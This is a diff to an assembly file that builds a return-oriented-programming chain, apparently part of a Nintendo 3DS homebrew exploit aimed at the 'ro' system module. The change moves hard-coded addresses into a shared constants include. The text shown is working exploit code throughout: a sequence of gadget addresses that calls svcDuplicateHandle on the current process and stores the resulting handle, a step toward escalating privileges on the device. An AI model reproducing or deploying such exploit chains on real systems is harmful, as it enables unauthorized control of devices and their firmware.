@@ -1,7 +1,6 @@
 .nds
 
-PROCESSHANDLEADR equ 0x14009600
-GARBAGEADR equ 0x14009700
+.include "../build/constants.s"
 
 .create "ro_initial_rop.bin",0x0
 
@@ -48,12 +47,12 @@ GARBAGEADR equ 0x14009700
 	.word 0x1400379c ; pop {r1, pc}
 		.word 0xFFFF8001 ; r1 (handle)
 	.word 0x140020C4 ; svcDuplicateHandle
-		.word PROCESSHANDLEADR ; output handle address
+		.word RO_PROCESSHANDLEADR ; output handle address
 	.word 0x1400379c ; pop {r1, pc}
-		.word GARBAGEADR ; r1 => r0 => garbage
+		.word RO_GARBAGEADR ; r1 => r0 => garbage
 	.word 0x140007d4 ; mov r0, r1 | pop {r3, r4, r5, pc}
 		.word 0xDEADC0DE ; r3 (garbage)
-		.word PROCESSHANDLEADR-4 ; r4 (later, r0 = [r4, #4])
+		.word RO_PROCESSHANDLEADR-4 ; r4 (later, r0 = [r4, #4])
 		.word 0xDEADC0DE ; r5 (garbage)
 	.word 0x1400379c ; pop {r1, pc}
 		.word 0x00000000 ; r1 => r2 (addr1)
